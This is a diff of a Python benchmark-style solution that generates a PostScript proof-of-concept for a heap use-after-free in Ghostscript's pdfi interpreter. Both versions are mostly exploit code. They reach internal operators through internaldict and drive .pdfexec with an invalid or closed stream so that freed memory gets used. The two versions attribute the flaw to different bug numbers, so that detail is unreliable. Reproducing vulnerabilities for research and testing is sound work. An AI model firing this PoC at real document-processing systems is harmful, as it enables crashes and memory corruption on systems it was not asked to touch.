@@ -3,68 +3,31 @@ import os
 class Solution:
     def solve(self, src_path: str) -> bytes:
         """
-        Generate a PoC that triggers the vulnerability.
-        
-        The vulnerability (arvo:42280 / Ghostscript Bug 704256) is a Heap Use-After-Free in pdfi.
-        It occurs when a pdfi context is created, but setting the input stream fails (e.g. invalid PDF).
-        The context is not properly cleaned up or validated, and subsequent usage of this context 
-        (specifically the NULL stream pointer) by other operators like .pdfexec triggers the crash.
+        Generate a PoC that triggers the Heap Use After Free vulnerability in pdfi.
+        The vulnerability (arvo:42280 / Bug 707051) is triggered when the pdfi input stream
+        initialization fails (e.g., via a closed or invalid stream), but the context is subsequently used.
         """
         
-        # We construct a PostScript file that:
-        # 1. Locates the internal pdfi operators (.pdfopen, .pdfexec).
-        # 2. Creates a file stream containing invalid PDF data.
-        # 3. Attempts to open this stream as a PDF context using .pdfopen.
-        #    This is expected to fail stream validation, but potentially leave the context in the provided dictionary.
-        # 4. Iterates through the dictionary to find the context object.
-        # 5. Calls .pdfexec on the context, triggering the Use-After-Free on the uninitialized/NULL stream.
+        # The PoC is a PostScript file that:
+        # 1. Accesses the internal .pdfexec operator (entry point for pdfi).
+        # 2. Creates a stream object that is closed, ensuring pdfi_set_input_stream fails.
+        # 3. Invokes .pdfexec with this stream, triggering the vulnerable error path and subsequent UAF.
         
-        return b"""%!PS
-/find_op {
-  % Check if name exists in where stack (userdict/systemdict)
-  dup where { exch get } {
-    % Check internaldict (1183615869)
-    pop 1183615869 internaldict exch
-    2 copy known { get } { pop pop null } ifelse
-  } ifelse
-} bind def
-
-% Potential names for the operators depending on build configuration
-/open_names [/.pdfopen /pdfopen /.pdfiopen /pdfiopen] def
-/exec_names [/.pdfexec /pdfexec /.pdfiexec /pdfiexec] def
-
-/get_op {
-  % Iterate names until an operator is found
-  { find_op dup null ne { exit } { pop } ifelse } forall
-} bind def
-
-/run_exploit {
-  open_names get_op /op_open exch def
-  exec_names get_op /op_exec exch def
-  
-  % Only proceed if operators are found
-  op_open null ne op_exec null ne and {
-    /ctx_dict 10 dict def
+        poc = b"""%!PS
+{
+  % Access the system internal dictionary (key 1183615869) to find .pdfexec
+  1183615869 internaldict /.pdfexec known {
+    % Create a dummy file stream
+    /s (%stdin) (r) file def
+    % Close the stream immediately. Passing a closed stream causes 
+    % pdfi_set_input_stream to fail, which is the prerequisite for this bug.
+    s closefile
     
-    % Create a stream with invalid PDF data (invalid header)
-    (INVALID_PDF_CONTENT) (r) file 
-    ctx_dict
-    
-    % Call .pdfopen inside stopped to handle the expected error
-    % .pdfopen(stream, dict)
-    { op_open exec } stopped pop
-    
-    % Check if context was deposited in dict despite failure
-    ctx_dict {
-      exch pop % discard key
-      % Value is on stack (potential context)
-      
-      % Attempt to execute context. This triggers access to ctx->stream which is NULL/invalid
-      { op_exec exec } stopped pop
-    } forall
+    % Invoke .pdfexec. The signature is typically: stream dict .pdfexec
+    % We pass an empty dictionary and our closed stream.
+    s << >> 1183615869 internaldict /.pdfexec get exec
   } if
-} def
-
-run_exploit
+} stopped
 quit
 """
+        return poc
